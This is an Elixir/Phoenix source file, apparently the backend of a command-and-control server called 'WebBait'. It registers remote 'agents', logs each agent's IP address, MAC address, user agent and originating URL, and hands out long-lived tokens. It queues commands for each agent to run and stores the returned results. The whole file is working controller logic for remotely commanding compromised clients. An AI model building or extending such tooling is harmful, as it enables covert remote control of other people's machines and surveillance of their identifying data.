defmodule WebBait.C2 do
  @moduledoc """
  The C2 context.
  """

  import Ecto.Query, warn: false
  alias Phoenix.PubSub
  alias WebBait.Repo

  alias WebBait.C2.{Agent, AgentToken, AgentActivity, AgentCommand, AgentCommandResult}

  @doc """
  Returns the list of agents.

  ## Examples

      iex> list_agents()
      [%Agent{}, ...]

  """
  def list_agents do
    Repo.all(Agent)
  end

  @doc """
  Gets a single agent.

  Raises `Ecto.NoResultsError` if the Agent does not exist.

  ## Examples

      iex> get_agent!(123)
      %Agent{}

      iex> get_agent!(456)
      ** (Ecto.NoResultsError)

  """
  def get_agent!(id), do: Repo.get!(Agent, id)

  @doc """
  Creates a agent.

  ## Examples

      iex> create_agent(%{field: value})
      {:ok, %Agent{}}

      iex> create_agent(%{field: bad_value})
      {:error, %Ecto.Changeset{}}

  """
  def create_agent(conn, attrs \\ %{}) do
    ip = to_string(:inet_parse.ntoa(conn.remote_ip))
    {_, userAgent} = Enum.find(conn.req_headers, fn {k, v} -> if k == "user-agent", do: v end)
    mac = attrs["mac"] || ""
    agentId = UUID.uuid4()
    token = UUID.uuid4()

    {:ok, agent} =
      %Agent{}
      |> Agent.changeset(%{
        "agentId" => agentId,
        "domain" => attrs["domain"],
        "url" => attrs["url"]
      })
      |> Repo.insert()

    {:ok, _} =
      agent
      |> Ecto.build_assoc(:tokens)
      |> AgentToken.changeset(%{
        "token" => token,
        "expiresAt" => DateTime.add(DateTime.utc_now(), 365, :day)
      })
      |> Repo.insert()

    {:ok, _} =
      agent
      |> Ecto.build_assoc(:activities)
      |> AgentActivity.changeset(%{
        "ip" => ip,
        "mac" => mac,
        "userAgent" => userAgent,
        "type" => :create_agent,
      })
      |> Repo.insert()

    PubSub.broadcast(WebBait.PubSub, "agents", "new agent")
    {:ok, agentId, token}
  end

  @doc """
  Deletes a agent.

  ## Examples

      iex> delete_agent(agent)
      {:ok, %Agent{}}

      iex> delete_agent(agent)
      {:error, %Ecto.Changeset{}}

  """
  def delete_agent(%Agent{} = agent) do
    Repo.delete(agent)
  end

  def generate_token(%Plug.Conn{} = conn, attrs \\ %{}) do
    ip = to_string(:inet_parse.ntoa(conn.remote_ip))
    {_, userAgent} = Enum.find(conn.req_headers, fn {k, v} -> if k == "user-agent", do: v end)
    mac = attrs["mac"] || ""
    token = UUID.uuid4()

    result = Repo.one(from(a in Agent, where: a.agentId == ^attrs["agentId"]))

    case result do
      nil ->
        {:error, :agent_not_found}

      %Agent{} = agent ->
        {:ok, _} =
          agent
          |> Ecto.build_assoc(:tokens)
          |> AgentToken.changeset(%{
            "token" => token,
            "expiresAt" => DateTime.add(DateTime.utc_now(), 365, :day)
          })
          |> Repo.insert()

        {:ok, _} =
          agent
          |> Ecto.build_assoc(:activities)
          |> AgentActivity.changeset(%{
            "ip" => ip,
            "mac" => mac,
            "userAgent" => userAgent,
            "type" => :generate_token,
          })
          |> Repo.insert()

        {:ok, token}
    end
  end

  def socket_activity(token, agentId, ip, userAgent, mac \\ "") do
    case Repo.one!(
           from(t in AgentToken, where: t.token == ^token and t.expiresAt > fragment("now()"))
         ) do
      %AgentToken{} = t ->
        agent = get_agent!(t.agent_id)

        if agent.agentId == agentId do
          from(t1 in AgentToken, where: t1.token == ^token and t1.used != true)
          |> Repo.update_all(set: [used: true, updated_at: DateTime.utc_now()])

          {:ok, _} =
            agent
            |> Ecto.build_assoc(:activities)
            |> AgentActivity.changeset(%{
              "ip" => ip,
              "mac" => mac,
              "userAgent" => userAgent,
              "type" => :socket_activity,
            })
            |> Repo.insert()

          {:ok, agent, t}
        else
          {:error, %{"reason" => "Agent ID mismatch"}}
        end

      nil ->
        {:error, %{"reason" => "Invalid token"}}
    end
  end

  def get_agent_activities(id) do
    Repo.all(from(activity in AgentActivity, where: activity.agent_id == ^id))
  end

  def get_agent_commands(id) do
    Repo.all(from(command in AgentCommand, where: command.agent_id == ^id))
    |> Repo.preload(:result)
  end

  def create_agent_command(id, command) do
    agent = get_agent!(id)
    cmdId = UUID.uuid4()
    {:ok, cmd} =
      agent
      |> Ecto.build_assoc(:commands)
      |> AgentCommand.changeset(%{
        "cmd" => command,
        "cmdId" => cmdId
      })
      |> Repo.insert()
    cmd
  end

  def delete_agent_command(id) do
     Repo.get(AgentCommand, id)
    |> Repo.delete()
  end

  def get_agent_undelivered_commmands(agentId) do
    agent = Repo.one(from(agent in Agent, where: agent.agentId == ^agentId))
    Repo.all(from(command in AgentCommand, where: command.agent_id == ^agent.id and command.received == false))
  end

  def mark_command_received(cmdId) do
    Repo.update_all(from(command in AgentCommand, where: command.cmdId == ^cmdId), set: [received: true, updated_at: DateTime.utc_now()])
  end

  def set_command_result(cmdId, result) do
    command = Repo.one(from(command in AgentCommand, where: command.cmdId == ^cmdId))
    command
    |> Ecto.build_assoc(:result)
    |> AgentCommandResult.changeset(%{
      "result" => result,
    })
    |> Repo.insert()
  end
end
